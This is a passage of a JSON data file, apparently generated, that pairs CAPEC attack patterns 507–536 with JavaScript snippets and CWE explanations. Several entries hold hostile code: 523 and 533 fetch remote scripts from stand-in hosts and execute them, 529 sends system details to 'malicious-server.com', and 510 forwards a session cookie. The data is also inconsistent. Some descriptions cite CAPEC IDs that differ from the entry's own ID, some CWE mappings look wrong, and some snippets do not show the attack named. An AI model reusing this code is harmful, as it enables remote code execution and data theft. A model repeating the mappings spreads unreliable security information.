        "description": "This JavaScript code snippet demonstrates a basic example of a tapjacking attack. When the DOM content is loaded, it creates a transparent overlay that covers the entire screen. Additionally, it places a hidden button in the center of the screen. When the user clicks anywhere on the overlay, the hidden button is triggered, simulating a tapjacking scenario. This code leverages CWE-1021 (Improper Restriction of Rendered UI Layers or Frames) by allowing clicks to pass through the visible overlay to the hidden button, and CWE-451 (User Interface (UI) Misrepresentation of Critical Information) by misleading the user about the actual interface they are interacting with."
    },
    {
        "capec_id": "507",
        "capec_name": "Physical Theft",
        "code_snippet": "const fs = require('fs');\n\n// Store sensitive information in a file without proper access control\nconst sensitiveData = 'user_password=supersecret';\nfs.writeFileSync('/tmp/sensitive_data.txt', sensitiveData);\n\n// Simulate improper physical access control by not restricting file access\nconsole.log('Sensitive data stored at /tmp/sensitive_data.txt');",
        "description": "This JavaScript code snippet demonstrates the concept of 'Physical Theft' by storing sensitive information in a file without proper access control mechanisms. The sensitive data (e.g., a user password) is written to a file in the /tmp directory, which is typically accessible to anyone with physical access to the system. This embodies CWE-921 (Storage of Sensitive Data in a Mechanism without Access Control) and CWE-922 (Insecure Storage of Sensitive Information). The code does not implement any access restrictions, making it vulnerable to unauthorized access if an adversary gains physical access to the system, aligning with the CAPEC description."
    },
    {
        "capec_id": "508",
        "capec_name": "Shoulder Surfing",
        "code_snippet": "document.getElementById('loginButton').addEventListener('click', function() {\n  var username = document.getElementById('username').value;\n  var password = document.getElementById('password').value;\n  console.log('Logging in with username: ' + username + ' and password: ' + password);\n  // Transmit credentials in cleartext\n  var xhr = new XMLHttpRequest();\n  xhr.open('POST', 'http://example.com/login', true);\n  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\n  xhr.send('username=' + username + '&password=' + password);\n});",
        "description": "This JavaScript code snippet demonstrates a login function that is vulnerable to shoulder surfing and other related weaknesses. When the login button is clicked, it retrieves the username and password from input fields and logs them to the console, exposing sensitive information (CWE-200, CWE-359). Additionally, it sends the credentials in cleartext over an HTTP connection (CWE-319), which can be intercepted by unauthorized actors. This code exemplifies the risks associated with shoulder surfing and the exposure of sensitive information to unauthorized individuals."
    },
    {
        "capec_id": "509",
        "capec_name": "Kerberoasting",
        "code_snippet": "const crypto = require('crypto');\nconst fs = require('fs');\n\n// Simulate obtaining a service ticket encrypted with RC4\nfunction getServiceTicket() {\n  const serviceTicket = 'fakeEncryptedServiceTicket'; // Placeholder for actual service ticket\n  return serviceTicket;\n}\n\n// Simulate saving the ticket to disk\nfunction saveTicketToDisk(ticket) {\n  fs.writeFileSync('ticket.enc', ticket);\n}\n\n// Simulate brute-forcing the hashed value\nfunction bruteForceTicket(ticket) {\n  const possibleKeys = ['weakpassword1', 'password123', 'admin']; // Weak password examples\n  for (const key of possibleKeys) {\n    const decipher = crypto.createDecipher('rc4', key);\n    let decrypted;\n    try {\n      decrypted = decipher.update(ticket, 'hex', 'utf8');\n      decrypted += decipher.final('utf8');\n      console.log(`Decrypted with key: ${key} -> ${decrypted}`);\n      return key;\n    } catch (err) {\n      // Ignore decryption errors\n    }\n  }\n  return null;\n}\n\nconst ticket = getServiceTicket();\nsaveTicketToDisk(ticket);\nconst crackedKey = bruteForceTicket(ticket);\nif (crackedKey) {\n  console.log(`Successfully cracked the ticket with key: ${crackedKey}`);\n} else {\n  console.log('Failed to crack the ticket');\n}",
        "description": "This JavaScript code snippet simulates the Kerberoasting attack described in the CAPEC. It demonstrates how an attacker might obtain a service ticket, save it to disk, and then attempt to brute-force the ticket using weak passwords. The code highlights several related CWEs: 'Insufficiently Protected Credentials' (CWE-522) by using a weak encryption method (RC4) and weak passwords, 'Use of Single-factor Authentication' (CWE-308) by relying on passwords alone, and 'Weak Password Requirements' (CWE-521) by using easily guessable passwords. The code is a simplified representation of the attack, focusing on the core idea of exploiting weak authentication mechanisms to gain unauthorized access."
    },
    {
        "capec_id": "510",
        "capec_name": "SaaS User Request Forgery",
        "code_snippet": "const maliciousApp = () => {\n  const trustedUserSession = document.cookie;\n  fetch('https://trusted-saas-app.com/api/performAction', {\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/json',\n      'Authorization': `Bearer ${trustedUserSession}`\n    },\n    body: JSON.stringify({ action: 'maliciousAction' })\n  })\n  .then(response => response.json())\n  .then(data => console.log('Action performed:', data))\n  .catch(error => console.error('Error:', error));\n};\n\n// Simulate the execution of the malicious app\nmaliciousApp();",
        "description": "This JavaScript code snippet represents a SaaS User Request Forgery attack. The maliciousApp function simulates a previously installed malicious application that leverages a trusted user's session cookie to perform unauthorized actions on a third-party SaaS application. The code fetches the session cookie from the document, which represents the trusted user's authenticated session. It then makes a POST request to the SaaS application's API endpoint, using the session cookie for authorization, and attempts to perform a malicious action. This demonstrates the exploitation of implicit trust and incorrect authorization checks (CWE-863, CWE-285) by the SaaS application, as it does not properly validate the origin of the request (CWE-346)."
    },
    {
        "capec_id": "511",
        "capec_name": "Infiltration of Software Development Environment",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-215: Insertion of Sensitive Information Into Debugging Code\nconst sensitiveInfo = 'API_KEY=12345';\nconsole.log(`Debug: Sensitive Info: ${sensitiveInfo}`);\n\n// CWE-434: Unrestricted Upload of File with Dangerous Type\nfunction uploadFile(file) {\n  const allowedExtensions = ['.txt', '.jpg'];\n  const fileExtension = path.extname(file.name);\n  if (!allowedExtensions.includes(fileExtension)) {\n    throw new Error('File type not allowed');\n  }\n  fs.writeFileSync(path.join(__dirname, 'uploads', file.name), file.data);\n}\n\n// CWE-506: Embedded Malicious Code\nfunction maliciousFunction() {\n  // This function simulates malicious behavior\n  fs.writeFileSync('/tmp/malicious.txt', 'This is a malicious file');\n}\n\n// CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nfunction getSystemInfo() {\n  return {\n    os: process.platform,\n    nodeVersion: process.version,\n    memoryUsage: process.memoryUsage()\n  };\n}\n\n// CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\nfunction exposeSensitiveInfo() {\n  const systemInfo = getSystemInfo();\n  console.log(`System Info: ${JSON.stringify(systemInfo)}`);\n}\n\n// Simulate an attack by calling the functions\nmaliciousFunction();\nexposeSensitiveInfo();\n",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities that align with the CAPEC description of infiltrating a software development environment. The code includes:\n\n1. **CWE-215**: Sensitive information (an API key) is inserted into debugging code, which is logged to the console.\n2. **CWE-434**: A function to upload files checks for allowed extensions but can be bypassed if the check is not comprehensive.\n3. **CWE-506**: A function simulates malicious behavior by writing a file to the system.\n4. **CWE-497**: A function retrieves and returns sensitive system information.\n5. **CWE-200**: Sensitive system information is exposed by logging it to the console.\n\nThe code simulates an attack by calling the `maliciousFunction` and `exposeSensitiveInfo` functions, representing the infiltration and exfiltration of sensitive data within an IDE environment."
    },
    {
        "capec_id": "516",
        "capec_name": "Hardware Component Substitution During Baselining",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Simulate dependency on a third-party component\nconst thirdPartyComponent = require('untrusted-component');\n\n// Function to simulate hardware component substitution\nfunction substituteHardwareComponent() {\n  // Path to the baseline hardware component\n  const baselineComponentPath = path.join(__dirname, 'baselineComponent.js');\n  // Path to the malicious hardware component\n  const maliciousComponentPath = path.join(__dirname, 'maliciousComponent.js');\n\n  // Check if the baseline component exists\n  if (fs.existsSync(baselineComponentPath)) {\n    // Replace the baseline component with the malicious one\n    fs.copyFileSync(maliciousComponentPath, baselineComponentPath);\n    console.log('Hardware component substituted successfully.');\n  } else {\n    console.log('Baseline component not found.');\n  }\n}\n\n// Simulate the substitution during the product development phase\nsubstituteHardwareComponent();\n\n// Simulate the use of the substituted component\nthirdPartyComponent.performOperation();",
        "description": "This JavaScript code snippet simulates the substitution of a hardware component during the product development phase, embodying the main idea of CAPEC-Name: 'Hardware Component Substitution During Baselining'. The code demonstrates a dependency on a third-party component (CWE-1395) and the substitution of a baseline hardware component with a malicious one. The `substituteHardwareComponent` function checks for the existence of the baseline component and replaces it with a malicious component if found. This represents the potential for an adversary to introduce vulnerabilities or malicious behavior into the final product by tampering with hardware components during development. The `thirdPartyComponent.performOperation()` call simulates the use of the compromised component, highlighting the risk of relying on untrusted or vulnerable components (CWE-1357)."
    },
    {
        "capec_id": "517",
        "capec_name": "Documentation Alteration to Circumvent Dial-down",
        "code_snippet": "const fs = require('fs');\n\n// CWE-1263: Improper Physical Access Control\n// Simulating unauthorized access to documentation\nconst unauthorizedAccess = (filePath) => {\n  try {\n    // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n    let data = fs.readFileSync(filePath, 'utf8');\n    console.log('Sensitive Data Accessed:', data);\n\n    // CWE-1059: Insufficient Technical Documentation\n    if (!data.includes('critical component')) {\n      console.log('Insufficient documentation detected.');\n    }\n\n    // CWE-695: Use of Low-Level Functionality\n    // Altering the documentation to circumvent dial-down functionality\n    data = data.replace('restricted', 'unrestricted');\n\n    // CWE-222: Truncation of Security-relevant Information\n    data = data.substring(0, 100); // Truncate data to obscure changes\n    fs.writeFileSync(filePath, data);\n    console.log('Documentation altered successfully.');\n  } catch (err) {\n    console.error('Error accessing or modifying the file:', err);\n  }\n};\n\n// Example usage\nunauthorizedAccess('path/to/documentation.txt');",
        "description": "This JavaScript code snippet simulates an attack where an unauthorized actor gains access to sensitive documentation and alters it to circumvent dial-down functionality requirements. The code reads a file containing sensitive information (CWE-200), checks for insufficient documentation (CWE-1059), and then modifies the content to change 'restricted' to 'unrestricted' (CWE-695). Finally, it truncates the data to obscure the changes (CWE-222). This represents the main idea of the CAPEC by demonstrating how an attacker can alter documentation to bypass restrictions on advanced technologies."
    },
    {
        "capec_id": "518",
        "capec_name": "Documentation Alteration to Produce Under-performing Systems",
        "code_snippet": "/* Insufficient Technical Documentation and Exposure of Sensitive System Information */\n\n// Function to initialize system with sensitive configuration\nfunction initializeSystem(config) {\n    // Missing documentation for design and insufficient technical documentation\n    // No clear description of what 'config' should contain\n    if (!config) {\n        throw new Error('Configuration is required');\n    }\n    // Use of low-level functionality\n    let systemState = lowLevelInit(config);\n    // Improper following of specification by caller\n    if (systemState !== 'initialized') {\n        throw new Error('System failed to initialize');\n    }\n    return systemState;\n}\n\n// Function to perform low-level initialization (exposed sensitive information)\nfunction lowLevelInit(config) {\n    // Sensitive system information exposed\n    console.log('Initializing system with config:', config);\n    // Simulate initialization\n    return 'initialized';\n}\n\n// Example usage\ntry {\n    let config = { key: 'value' }; // Insufficient documentation on what keys/values are needed\n    let state = initializeSystem(config);\n    console.log('System state:', state);\n} catch (error) {\n    console.error('Error:', error.message);\n}",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker could alter documentation to produce an under-performing system. The `initializeSystem` function lacks sufficient technical documentation and design documentation, making it unclear what the `config` parameter should contain. The `lowLevelInit` function exposes sensitive system information by logging the configuration, which should be protected. Additionally, the code uses low-level functionality and does not follow proper specifications, leading to potential errors during system initialization. This embodies the CAPEC idea of altering documentation to introduce flaws and vulnerabilities in the system."
    },
    {
        "capec_id": "519",
        "capec_name": "Documentation Alteration to Cause Errors in System Design",
        "code_snippet": "/* Documentation Alteration to Cause Errors in System Design */\n\n// Original Documentation\n// Function: calculateTotal\n// Description: This function calculates the total price including tax.\n// Parameters: price (number), taxRate (number)\n// Returns: total (number)\n\n// Maliciously Altered Documentation\n// Function: calculateTotal\n// Description: This function calculates the total price excluding tax.\n// Parameters: price (number), taxRate (number)\n// Returns: total (number)\n\nfunction calculateTotal(price, taxRate) {\n  // Incorrect Provision of Specified Functionality (CWE-684)\n  // The function is supposed to include tax but the documentation says otherwise\n  return price + (price * taxRate); // Original correct implementation\n}\n\n// Usage based on altered documentation\nlet total = calculateTotal(100, 0.1); // Expecting 100 but gets 110\nconsole.log('Total:', total); // Outputs: Total: 110\n",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker has maliciously altered the documentation of a function to cause errors in system design. The original documentation specifies that the function 'calculateTotal' calculates the total price including tax. However, the attacker has altered the documentation to state that the function calculates the total price excluding tax. This discrepancy can lead to incorrect usage of the function, as users will expect a different behavior based on the altered documentation. The code also highlights CWE-684 (Incorrect Provision of Specified Functionality) by showing that the function's implementation does not match the altered documentation, potentially leading to errors in the system."
    },
    {
        "capec_id": "520",
        "capec_name": "Counterfeit Hardware Component Inserted During Product Assembly",
        "code_snippet": "class HardwareComponent {\n  constructor() {\n    this.trusted = false;\n    this.maliciousCode = () => {\n      console.log('Executing malicious code...');\n      // Malicious actions here\n    };\n  }\n\n  execute() {\n    if (!this.trusted) {\n      this.maliciousCode();\n    } else {\n      console.log('Executing normal operations...');\n      // Normal operations here\n    }\n  }\n}\n\n// Simulate the insertion of a counterfeit component\nconst counterfeitComponent = new HardwareComponent();\ncounterfeitComponent.execute();",
        "description": "This JavaScript code snippet represents a counterfeit hardware component being inserted during product assembly, embodying the main idea of the CAPEC. The `HardwareComponent` class has a `trusted` property that determines whether the component is legitimate or counterfeit. If the component is not trusted, it executes malicious code, simulating the behavior of an embedded malicious code (CWE-506). The counterfeit component is instantiated and its `execute` method is called, demonstrating how the malicious code is executed when the component is not trusted. This snippet highlights the risk of relying on insufficiently trustworthy components (CWE-1357) and the potential for observable behavioral discrepancies (CWE-207) when counterfeit components are used."
    },
    {
        "capec_id": "521",
        "capec_name": "Hardware Design Specifications Are Altered",
        "code_snippet": "const hardwareSpecs = {\n  registerDefaults: {\n    secureRegister: 0x00, // CWE-1221: Incorrect Register Defaults\n    debugMode: false // CWE-1296: Incorrect Chaining or Granularity of Debug Components\n  },\n  lockBit: false // CWE-1231: Improper Prevention of Lock Bit Modification\n};\n\n// CWE-657: Violation of Secure Design Principles\nfunction alterHardwareSpecs(specs) {\n  specs.registerDefaults.secureRegister = 0xFF; // Insecure value\n  specs.debugMode = true; // Enable debug mode\n  specs.lockBit = true; // Set lock bit\n  specs.lockBit = false; // Modify lock bit after setting\n}\n\n// Simulate an attacker altering the hardware design specifications\nalterHardwareSpecs(hardwareSpecs);\n\nconsole.log(hardwareSpecs);",
        "description": "This JavaScript code snippet simulates an attacker altering hardware design specifications, embodying the main idea of the CAPEC 'Hardware Design Specifications Are Altered'. The code defines a hardware specification object with insecure default values (CWE-1221) and debug mode settings (CWE-1296). It also includes a lock bit that can be modified after being set (CWE-1231). The function 'alterHardwareSpecs' demonstrates how an attacker might change these specifications, violating secure design principles (CWE-657). The final console log shows the altered hardware specifications, representing the potential vulnerabilities introduced by such an attack."
    },
    {
        "capec_id": "522",
        "capec_name": "Malicious Hardware Component Replacement",
        "code_snippet": "class HardwareComponent {\n  constructor() {\n    this.updateable = false; // CWE-1329: Component is not updateable\n    this.trustworthy = false; // CWE-1357: Insufficiently trustworthy component\n  }\n\n  performCriticalOperation() {\n    if (!this.trustworthy) {\n      console.error('Error: Untrusted hardware component in use!');\n      // CWE-1334: Injecting error to degrade system redundancy\n      this.injectError();\n    }\n    // CWE-506: Embedded malicious code\n    this.maliciousCode();\n  }\n\n  injectError() {\n    console.log('Injecting error to degrade system redundancy...');\n  }\n\n  maliciousCode() {\n    console.log('Executing malicious code...');\n  }\n}\n\n// Simulating the use of a vulnerable third-party component (CWE-1395)\nconst vulnerableComponent = new HardwareComponent();\nvulnerableComponent.performCriticalOperation();",
        "description": "This JavaScript code snippet defines a class `HardwareComponent` that simulates a hardware component with several vulnerabilities. The component is marked as not updateable (CWE-1329) and not trustworthy (CWE-1357). The `performCriticalOperation` method checks if the component is trustworthy and, if not, logs an error and injects an error to degrade system redundancy (CWE-1334). It also contains a method to execute malicious code (CWE-506). Finally, the code simulates the use of this vulnerable component, representing a dependency on a vulnerable third-party component (CWE-1395). This snippet embodies the main idea of CAPEC-452, where an adversary replaces legitimate hardware with a compromised one, leading to potential system disruption and further compromise."
    },
    {
        "capec_id": "523",
        "capec_name": "Malicious Software Implanted",
        "code_snippet": "const fs = require('fs');\nconst http = require('http');\n\n// CWE-1395: Dependency on Vulnerable Third-Party Component\nconst vulnerableLib = require('vulnerable-lib');\n\n// CWE-506: Embedded Malicious Code\nfunction maliciousFunction() {\n  // CWE-509: Replicating Malicious Code (Virus or Worm)\n  http.get('http://malicious-server.com/payload', (res) => {\n    res.on('data', (chunk) => {\n      fs.writeFileSync('/tmp/malicious_payload', chunk);\n      require('/tmp/malicious_payload');\n    });\n  });\n}\n\n// CWE-1229: Creation of Emergent Resource\nfunction createEmergentResource() {\n  fs.writeFileSync('/tmp/emergent_resource', 'This is an emergent resource');\n}\n\n// CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\nfunction injectErrors() {\n  fs.writeFileSync('/dev/hardware_component', 'error');\n}\n\n// Main function to simulate the malicious software implantation\nfunction main() {\n  if (vulnerableLib.isVulnerable()) {\n    maliciousFunction();\n    createEmergentResource();\n    injectErrors();\n  }\n}\n\nmain();",
        "description": "This JavaScript code snippet demonstrates the concept of 'Malicious Software Implanted' in a system, as described by the CAPEC. The code includes several vulnerabilities and malicious actions: \n1. CWE-1395: It uses a vulnerable third-party library ('vulnerable-lib').\n2. CWE-506: It contains a function ('maliciousFunction') that fetches and executes a malicious payload from a remote server.\n3. CWE-509: The malicious payload could replicate itself to other systems.\n4. CWE-1229: It creates an emergent resource ('/tmp/emergent_resource') that could be exploited by attackers.\n5. CWE-1334: It injects errors into a hardware component to degrade its redundancy.\nThe 'main' function checks if the vulnerable library is indeed vulnerable and then executes the malicious actions, simulating the implantation of malicious software in a system."
    },
    {
        "capec_id": "524",
        "capec_name": "Rogue Integration Procedures",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst bodyParser = require('body-parser');\nconst fs = require('fs');\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// CWE-829: Including functionality from an untrusted source\nconst maliciousLibrary = require('malicious-library');\n\napp.post('/upload', (req, res) => {\n  const { fileContent } = req.body;\n\n  // CWE-506: Embedded malicious code\n  if (fileContent.includes('<script>maliciousCode()</script>')) {\n    res.status(400).send('Malicious content detected!');\n    return;\n  }\n\n  // CWE-89: SQL Injection vulnerability\n  const query = `INSERT INTO files (content) VALUES ('${fileContent}')`;\n  database.execute(query, (err) => {\n    if (err) {\n      res.status(500).send('Database error');\n      return;\n    }\n    res.status(200).send('File uploaded successfully');\n  });\n});\n\n// CWE-707: Improper neutralization of input\napp.get('/file/:id', (req, res) => {\n  const fileId = req.params.id;\n  fs.readFile(`/files/${fileId}`, 'utf8', (err, data) => {\n    if (err) {\n      res.status(500).send('File read error');\n      return;\n    }\n    res.status(200).send(data);\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a web server using the Express framework. It demonstrates several vulnerabilities related to the CAPEC 'Rogue Integration Procedures' and the associated CWEs. The code includes:\n\n1. **CWE-829**: The inclusion of a potentially malicious library from an untrusted source (`malicious-library`).\n2. **CWE-506**: A check for embedded malicious code within uploaded file content, though the check itself is simplistic and not comprehensive.\n3. **CWE-89**: An SQL Injection vulnerability where user input is directly included in an SQL query without proper sanitization.\n4. **CWE-707**: Improper neutralization of input when reading a file based on user-provided input, which could lead to path traversal or other issues.\n\nThe code embodies the main idea of the CAPEC by showing how an attacker could alter or establish rogue processes (e.g., by including a malicious library) to insert malicious components into the system, leading to potential disruptions or compromises when the system is deployed."
    },
    {
        "capec_id": "528",
        "capec_name": "XML Flood",
        "code_snippet": "const http = require('http');\nconst xml2js = require('xml2js');\n\nconst server = http.createServer((req, res) => {\n  if (req.method === 'POST') {\n    let body = '';\n    req.on('data', chunk => {\n      body += chunk.toString();\n    });\n    req.on('end', () => {\n      xml2js.parseString(body, (err, result) => {\n        if (err) {\n          res.writeHead(400, {'Content-Type': 'text/plain'});\n          res.end('Invalid XML');\n        } else {\n          // Process the XML data\n          res.writeHead(200, {'Content-Type': 'text/plain'});\n          res.end('XML received');\n        }\n      });\n    });\n  } else {\n    res.writeHead(405, {'Content-Type': 'text/plain'});\n    res.end('Method Not Allowed');\n  }\n});\n\nserver.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js that listens for POST requests containing XML data. The server reads the incoming XML data and attempts to parse it using the 'xml2js' library. If the XML is invalid, it responds with a 400 status code. If the XML is valid, it responds with a 200 status code. This code is vulnerable to an XML Flood attack (CAPEC-230) because it does not impose any limits on the size or number of XML requests it can handle (CWE-770). Additionally, it does not validate the XML against a schema (CWE-112), making it susceptible to malformed XML. The code also does not restrict XML external entity references (CWE-611) or recursive entity references in DTDs (CWE-776), which can lead to further vulnerabilities such as XML External Entity (XXE) attacks and XML Entity Expansion (XEE) attacks."
    },
    {
        "capec_id": "529",
        "capec_name": "Malware-Directed Internal Reconnaissance",
        "code_snippet": "const http = require('http');\nconst os = require('os');\nconst fs = require('fs');\n\n// Function to gather system information\nfunction gatherSystemInfo() {\n  const systemInfo = {\n    hostname: os.hostname(),\n    platform: os.platform(),\n    arch: os.arch(),\n    cpus: os.cpus(),\n    networkInterfaces: os.networkInterfaces()\n  };\n  return systemInfo;\n}\n\n// Function to send gathered information to an external server\nfunction sendInfoToServer(info) {\n  const options = {\n    hostname: 'malicious-server.com',\n    port: 80,\n    path: '/collect-info',\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/json'\n    }\n  };\n\n  const req = http.request(options, (res) => {\n    res.on('data', (chunk) => {\n      console.log(`BODY: ${chunk}`);\n    });\n  });\n\n  req.on('error', (e) => {\n    console.error(`Problem with request: ${e.message}`);\n  });\n\n  req.write(JSON.stringify(info));\n  req.end();\n}\n\n// Main function to execute the malicious actions\nfunction main() {\n  const info = gatherSystemInfo();\n  sendInfoToServer(info);\n}\n\n// Execute the main function\nmain();",
        "description": "This JavaScript code snippet demonstrates a malware-directed internal reconnaissance attack. The code gathers sensitive system information such as hostname, platform, architecture, CPU details, and network interfaces using the 'os' module. It then sends this information to an external malicious server using an HTTP POST request. This embodies the CAPEC concept of using malware to gather internal system information and aligns with CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) and CWE-506 (Embedded Malicious Code). The code represents a typical spyware behavior (CWE-512) by collecting and exfiltrating data without user consent."
    },
    {
        "capec_id": "530",
        "capec_name": "Provide Counterfeit Component",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Simulate the use of a third-party component\nconst thirdPartyComponentPath = path.join(__dirname, 'thirdPartyComponent.js');\n\n// Check if the third-party component exists\nif (fs.existsSync(thirdPartyComponentPath)) {\n  // Load the third-party component\n  const thirdPartyComponent = require(thirdPartyComponentPath);\n  \n  // Use the third-party component\n  thirdPartyComponent.execute();\n} else {\n  console.error('Third-party component not found.');\n}\n\n// Simulate the third-party component with embedded malicious code\n// thirdPartyComponent.js\n// module.exports = {\n//   execute: function() {\n//     // Malicious behavior\n//     console.log('Executing malicious code...');\n//     // Example of malicious action: deleting a critical file\n//     fs.unlinkSync('/path/to/critical/file');\n//   }\n// };",
        "description": "This JavaScript code snippet demonstrates the concept of 'Provide Counterfeit Component' by simulating the use of a third-party component that could be counterfeit or malicious. The code checks for the existence of a third-party component file and then loads and executes it. The embedded comment within the code simulates a malicious third-party component that performs a harmful action, such as deleting a critical file. This example embodies the CAPEC idea by showing how an attacker could provide a counterfeit component that gets integrated into a system, leading to potential disruption or compromise. The related CWEs are represented by the dependency on a potentially vulnerable or untrustworthy third-party component and the possibility of embedded malicious code."
    },
    {
        "capec_id": "531",
        "capec_name": "Hardware Component Substitution",
        "code_snippet": "class HardwareComponent {\n  constructor(name, version) {\n    this.name = name;\n    this.version = version;\n    this.isMalicious = false;\n  }\n\n  updateFirmware(newVersion) {\n    if (this.isMalicious) {\n      console.log('Malicious firmware update detected!');\n      // Inject malicious code\n      this.injectMaliciousCode();\n    } else {\n      this.version = newVersion;\n      console.log(`Firmware updated to version ${newVersion}`);\n    }\n  }\n\n  injectMaliciousCode() {\n    // Simulate malicious behavior\n    console.log('Executing malicious code...');\n    // Example: Unauthorized error injection\n    this.degradeHardwareRedundancy();\n  }\n\n  degradeHardwareRedundancy() {\n    console.log('Hardware redundancy degraded!');\n  }\n}\n\n// Example usage\nlet component = new HardwareComponent('ComponentA', '1.0');\ncomponent.isMalicious = true; // Simulate substitution with a malicious component\ncomponent.updateFirmware('2.0');",
        "description": "This JavaScript code snippet defines a `HardwareComponent` class that simulates the substitution of a tested and approved hardware component with a maliciously-altered one. The `updateFirmware` method checks if the component is malicious and, if so, injects malicious code that degrades hardware redundancy, representing CWE-1334. The `injectMaliciousCode` method simulates the execution of embedded malicious code (CWE-506). This snippet embodies the main idea of CAPEC-187 by demonstrating how an attacker could substitute a hardware component to cause disruption or additional compromise."
    },
    {
        "capec_id": "532",
        "capec_name": "Altered Installed BIOS",
        "code_snippet": "const fs = require('fs');\n\n// Simulate downloading a malicious BIOS update\nfunction downloadMaliciousBIOS() {\n  return 'malicious_bios.bin';\n}\n\n// Simulate updating the BIOS with the downloaded file\nfunction updateBIOS(biosFile) {\n  if (!fs.existsSync(biosFile)) {\n    console.error('BIOS file does not exist.');\n    return;\n  }\n  // Simulate the BIOS update process\n  console.log('Updating BIOS with', biosFile);\n  // Vulnerability: No verification of the BIOS file's integrity or authenticity\n  fs.writeFileSync('/system/bios.bin', fs.readFileSync(biosFile));\n  console.log('BIOS update complete.');\n}\n\n// Main function to demonstrate the attack\nfunction main() {\n  const biosFile = downloadMaliciousBIOS();\n  updateBIOS(biosFile);\n}\n\nmain();",
        "description": "This JavaScript code snippet simulates the process of downloading and updating a BIOS with a malicious file. The `downloadMaliciousBIOS` function represents the attacker sending a maliciously altered BIOS file. The `updateBIOS` function simulates the BIOS update process, but it lacks proper verification of the BIOS file's integrity or authenticity, embodying CWE-506 (Embedded Malicious Code) and CWE-1277 (Firmware Not Updateable). The code demonstrates how an attacker could exploit the system by replacing the BIOS with a malicious version, leading to potential future exploitation. This represents the main idea of the CAPEC 'Altered Installed BIOS'."
    },
    {
        "capec_id": "533",
        "capec_name": "Malicious Manual Software Update",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\n// CWE-494: Download of Code Without Integrity Check\nhttp.get('http://malicious-website.com/update.js', (res) => {\n  let data = '';\n  res.on('data', (chunk) => { data += chunk; });\n  res.on('end', () => {\n    // CWE-506: Embedded Malicious Code\n    fs.writeFile('update.js', data, (err) => {\n      if (err) throw err;\n      console.log('Update downloaded and saved.');\n      // Execute the downloaded script without integrity check\n      require('./update.js');\n    });\n  });\n}).on('error', (err) => {\n  console.error('Error downloading update:', err.message);\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable software update mechanism. It downloads a script from a remote location without verifying its integrity (CWE-494). The downloaded script is then saved and executed, potentially containing embedded malicious code (CWE-506). This embodies the main idea of the CAPEC 'Malicious Manual Software Update', where an attacker can introduce malicious code through a software update process. The lack of integrity checks and the direct execution of the downloaded code highlight the security weaknesses that can be exploited by an attacker."
    },
    {
        "capec_id": "534",
        "capec_name": "Malicious Hardware Update",
        "code_snippet": "class HardwareComponent {\n  constructor() {\n    this.firmwareVersion = '1.0.0';\n    this.isUpdateable = false; // CWE-1277: Firmware Not Updateable\n  }\n\n  updateFirmware(newFirmware) {\n    if (this.isUpdateable) {\n      this.firmwareVersion = newFirmware;\n    } else {\n      console.log('Firmware update not supported.');\n    }\n  }\n\n  injectMaliciousCode() { // CWE-506: Embedded Malicious Code\n    console.log('Malicious code executed.');\n    // Malicious actions here\n  }\n}\n\n// Simulate hardware replacement with malicious component\nlet component = new HardwareComponent();\ncomponent.injectMaliciousCode();",
        "description": "This JavaScript code snippet represents a simplified model of a hardware component that cannot be updated (CWE-1277: Firmware Not Updateable). The `HardwareComponent` class has a method `updateFirmware` that checks if the firmware is updateable before attempting an update. The `injectMaliciousCode` method simulates the presence of embedded malicious code (CWE-506: Embedded Malicious Code). The main idea of the CAPEC is embodied by simulating a scenario where a hardware component is replaced with a malicious one, which then executes harmful actions. This demonstrates how an adversary could exploit the inability to update firmware to introduce malicious behavior."
    },
    {
        "capec_id": "535",
        "capec_name": "Malicious Gray Market Hardware",
        "code_snippet": "class MaliciousHardware {\n  constructor() {\n    this.firmware = this.loadFirmware();\n  }\n\n  loadFirmware() {\n    // CWE-506: Embedded Malicious Code\n    return `function maliciousFunction() {\n      // Malicious code that compromises the system\n      console.log('System compromised');\n    }`;\n  }\n\n  updateFirmware() {\n    // CWE-1329: Reliance on Component That is Not Updateable\n    throw new Error('Firmware update not supported');\n  }\n\n  useThirdPartyComponent() {\n    // CWE-1395: Dependency on Vulnerable Third-Party Component\n    const vulnerableComponent = require('vulnerable-component');\n    vulnerableComponent.execute();\n  }\n\n  accessConfidentialInfo() {\n    // CWE-1297: Unprotected Confidential Information on Device is Accessible by OSAT Vendors\n    const confidentialInfo = this.getConfidentialInfo();\n    console.log(confidentialInfo);\n  }\n\n  getConfidentialInfo() {\n    return 'Sensitive Data';\n  }\n}\n\nconst hardware = new MaliciousHardware();\nhardware.useThirdPartyComponent();\nhardware.accessConfidentialInfo();",
        "description": "This JavaScript code snippet represents a malicious hardware component that embodies the main idea of the CAPEC 'Malicious Gray Market Hardware'. The class 'MaliciousHardware' contains several methods that illustrate the related CWEs. The 'loadFirmware' method includes embedded malicious code (CWE-506). The 'updateFirmware' method demonstrates reliance on a component that cannot be updated (CWE-1329). The 'useThirdPartyComponent' method shows dependency on a vulnerable third-party component (CWE-1395). The 'accessConfidentialInfo' method illustrates unprotected confidential information accessible by OSAT vendors (CWE-1297). This code snippet highlights how malicious hardware can compromise a system by embedding malicious code, relying on unupdateable and vulnerable components, and exposing sensitive information."
    },
    {
        "capec_id": "536",
        "capec_name": "Data Injected During Configuration",
